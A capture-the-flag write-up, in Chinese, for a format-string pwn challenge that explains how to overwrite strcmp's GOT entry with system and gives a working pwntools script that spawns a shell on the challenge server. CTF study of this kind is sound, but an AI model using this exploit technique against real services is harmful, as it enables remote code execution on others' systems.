# PHM #64 Pwn — echo

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 50 |
| 連線 | `nc ctf.hackme.quest 7711` |
| 檔案 | [`/static/echo`](https://ctf.hackme.quest/static/echo) (ELF 32-bit, not stripped) |
| 提示 | format string vulnerability |
| 保護 | NX, No PIE, No canary |

## 分析

迴圈: `fgets(buf,0x100)` → `printf(buf)` (**格式字串漏洞**) → `strcmp(buf,"exit\n")`, 相等才 `system("echo Goodbye")` (誘餌; 而且 fgets 會留 `\n`, 正常輸入根本配不到 `"exit\n"`)。

No PIE → GOT 位址固定。用格式字串把 **`strcmp@got` (0x804a00c) 蓋成 `system@plt` (0x8048400)**。之後 `strcmp(buf, "exit\n")` 就變成 `system(buf)`, 再送一行 `/bin/sh` 就有 shell。

格式字串參數偏移 = **7** (`AAAA`→`%7$p`)。

## 解法

```python
from pwn import *
context(arch='i386', os='linux')
io=remote('ctf.hackme.quest',7711)
io.sendline(fmtstr_payload(7, {0x804a00c: 0x8048400}))  # strcmp@got -> system@plt
io.sendline(b'/bin/sh')                                 # strcmp(buf,..) == system(buf)
io.sendline(b'cat flag'); print(io.recvall(timeout=5))
```

## Flag

```
FLAG{printf vulnerability is fun, right? %16c%7$hhn%99c%7$hhn}
```

## 感想

最乾淨的 fmt → GOT overwrite: 選一個「輸入當第一個參數」的函式 (`strcmp`) 蓋成 `system`, 下一輪輸入就直接當指令。偏移用 `pwntools` 的 `fmtstr_payload` 一行搞定。
